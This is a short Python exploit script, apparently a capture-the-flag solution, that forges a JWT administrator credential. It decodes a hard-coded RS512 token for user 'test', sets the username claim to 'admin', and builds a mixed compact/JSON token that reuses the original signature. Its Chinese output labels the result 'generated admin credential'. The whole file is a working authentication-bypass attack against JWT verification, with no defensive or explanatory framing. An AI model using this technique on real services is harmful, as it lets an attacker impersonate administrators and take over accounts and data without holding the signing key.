from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode
import argparse

token="eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTE2OTkzMjUwLCJpYXQiOjE3NTE2OTU3MjUsImp0aSI6IlczZ3ZOZVN5TkE2UFlhQ0JwNl9Pd1EiLCJuYmYiOjE3NTE2OTU3MjUsInVzZXJuYW1lIjoidGVzdCJ9.EmpmaJxZObLSUgGOaVHtoenTty_6HLvupS_zIhDIl9reL6m4pNI4oXTbwHoVZaEl6uNc1723s3ucOrO4VUER6fxt73pIdy__H5aDyYouTvZ7oAYweGascQMNJMcydiFVR5_zi-WavXQa9BqM8RCPzas-FZu6hLwE9iPPXKXDUh7ZCV477mjLdF6jpAvp1KdprJhh_fMcDx_U7iSvO8gRG9RVlkWXE8N6rofzykPuXDvMWizHdvp_d19mTiLSinisErLjr-PFgxxeudzKTESEisgzoT8Pe1U8GQ0QCtirh4zDnakTDvbgzXnLJamAoILS4Tl3jG8UPywQzukM"
# token=input("[+] 请输入token:")
claim="username=admin"
[header, payload, signature] = token.split(".")
parsed_payload = loads(base64url_decode(payload))

try:
    claims =claim.split(",")
    for c in claims:
        key, value = c.split("=")
        parsed_payload[key.strip()] = value.strip()
except:
    print("[-] Given claims are not in a valid format")
    exit(1)

fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
new_payload = '{"' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
print(f'[+] 生成的admin凭证 : {new_payload}\n')